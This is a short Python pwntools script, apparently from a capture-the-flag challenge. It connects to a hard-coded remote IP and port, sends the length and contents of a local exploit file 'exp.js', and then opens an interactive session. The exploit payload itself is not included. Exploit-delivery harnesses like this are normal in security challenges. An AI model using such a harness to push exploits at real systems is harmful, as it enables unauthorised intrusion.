#!/usr/bin/python

from pwn import *
import sys


io = remote("1.13.101.243", 27781)
f = open("./exp.js", "r")
data = f.read()
io.sendlineafter(">>\n", str(len(data)))
io.send(data)
io.interactive()
